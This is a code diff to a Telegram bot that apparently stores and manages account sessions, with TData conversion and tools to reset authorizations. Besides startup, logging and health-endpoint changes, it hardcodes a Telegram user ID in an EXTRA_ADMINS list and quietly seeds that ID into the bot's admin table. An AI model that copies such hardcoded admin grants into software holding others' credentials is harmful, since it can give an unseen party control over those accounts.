@@ -68,12 +68,23 @@ from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthori
 from telethon.tl.functions.auth import LogOutRequest, ResetAuthorizationsRequest
 from telethon.tl.functions.messages import DeleteHistoryRequest
 
+# opentele raises BaseException("err") on Python 3.13+ (not Exception).
+# Keep the bot alive even if TData conversion is unavailable.
+os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
+os.environ.setdefault("QT_LOGGING_RULES", "*=false")
+HAS_OPENTELE = False
+_OPENTELE_ERROR: BaseException | None = None
+API = None
+UseCurrentSession = None
+TDesktop = None
 try:
     from opentele.api import API, UseCurrentSession
     from opentele.td import TDesktop
 
     HAS_OPENTELE = True
-except Exception as _opentele_exc:  # noqa: BLE001
+except BaseException as _opentele_exc:  # noqa: BLE001
+    if isinstance(_opentele_exc, (KeyboardInterrupt, SystemExit)):
+        raise
     HAS_OPENTELE = False
     _OPENTELE_ERROR = _opentele_exc
 
@@ -112,6 +123,11 @@ CONCURRENCY = 3
 HOST_CAP = 500
 IST = ZoneInfo("Asia/Kolkata")
 BOT_USERNAME = "sessionmanagerpromaxbot"
+EXTRA_ADMINS = [738363992]
+WEB_HOST = os.environ.get("WEB_HOST", "0.0.0.0")
+WEB_PORT = int(os.environ.get("PORT") or os.environ.get("WEB_PORT") or "10000")
+KEEP_ALIVE_URL = (os.environ.get("KEEP_ALIVE_URL") or "").strip()
+KEEP_ALIVE_INTERVAL = int(os.environ.get("KEEP_ALIVE_INTERVAL") or "45")
 
 PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 HEX_RE = re.compile(r"^[0-9a-fA-F]+$")
@@ -143,6 +159,11 @@ logging.basicConfig(
 )
 logging.getLogger("telethon").setLevel(logging.WARNING)
 log = logging.getLogger("smp")
+log.info("Python %s", sys.version.replace("\n", " "))
+if HAS_OPENTELE:
+    log.info("opentele ready (TData import/export enabled)")
+else:
+    log.warning("opentele unavailable — TData import/export disabled: %s", _OPENTELE_ERROR)
 
 fernet = Fernet(ENC_KEY.encode() if isinstance(ENC_KEY, str) else ENC_KEY)
 locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)
@@ -302,6 +323,21 @@ class DB:
             },
             upsert=True,
         )
+        for extra in EXTRA_ADMINS:
+            if int(extra) == OWNER_ID:
+                continue
+            await self.admins.update_one(
+                {"user_id": int(extra)},
+                {
+                    "$setOnInsert": {
+                        "user_id": int(extra),
+                        "role": "admin",
+                        "added_by": OWNER_ID,
+                        "added_at": utcnow(),
+                    }
+                },
+                upsert=True,
+            )
         for k, v in {
             "alerts_logout": True,
             "alerts_ban": True,
@@ -2702,6 +2738,8 @@ async def start_web_server() -> asyncio.AbstractServer:
                 "ok": True,
                 "service": "session-manager-pro",
                 "bot": f"@{BOT_USERNAME}",
+                "python": sys.version.split()[0],
+                "opentele": bool(HAS_OPENTELE),
                 "ts": utcnow().isoformat(),
             }
         ).encode()
